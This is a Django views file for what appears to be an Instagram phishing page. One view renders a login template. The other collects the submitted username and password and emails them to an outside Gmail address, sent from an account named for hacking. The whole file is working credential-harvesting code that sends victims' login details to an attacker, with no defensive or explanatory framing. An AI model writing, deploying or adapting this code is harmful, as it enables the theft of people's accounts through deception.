from django.http import HttpResponse
from django.shortcuts import render
from django.core.mail import send_mail


def instagram(request):
    return render(request, 'index.html')


def values(request):

    x=(request.POST.get('username', 'nothing'))
    y=(request.POST.get('password', 'nothing'))
    send_mail('django test mail', f'username and password respectively {x,y}', 'physicswallahhacking@gmail.com', ["r04itgupta@gmail.com"], fail_silently=False)
    return render(request, 'index.html')